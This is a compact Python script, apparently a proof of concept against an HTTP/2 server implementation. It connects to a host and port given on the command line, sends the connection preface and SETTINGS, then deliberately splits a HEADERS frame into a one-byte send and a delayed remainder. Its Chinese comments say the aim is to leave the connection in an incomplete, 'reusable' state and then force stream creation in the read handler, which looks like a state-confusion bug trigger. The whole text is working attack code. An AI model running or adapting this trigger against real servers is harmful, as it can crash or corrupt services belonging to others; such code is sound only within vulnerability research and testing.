import socket, struct, sys, time, threading

def fr(t,f,sid,p=b""):
    return struct.pack(">I",len(p))[1:]+bytes([t,f])+struct.pack(">I",sid)+p
PREFACE=b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
HP=bytes([0x82,0x86,0x44,0x05])+b"/slow"+bytes([0x41,0x09])+b"localhost"
HEADERS=fr(0x1,0x5,1,HP)

host,port=sys.argv[1],int(sys.argv[2])
s=socket.create_connection((host,port),timeout=5)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
s.sendall(PREFACE+fr(0x4,0,0))
stop=False
def reader():
    s.settimeout(0.05)
    while not stop:
        try:
            if not s.recv(65535): return
        except socket.timeout: continue
        except Exception: return
threading.Thread(target=reader,daemon=True).start()
time.sleep(0.4)
# 只发 1 字节帧头 -> state 不完整、无 stream -> reusable
s.sendall(HEADERS[:1])
time.sleep(0.3)
# 补发剩余帧头+payload -> 在 read_handler 里 create_stream
s.sendall(HEADERS[1:])
time.sleep(0.5)
print("sent")
stop=True; s.close()
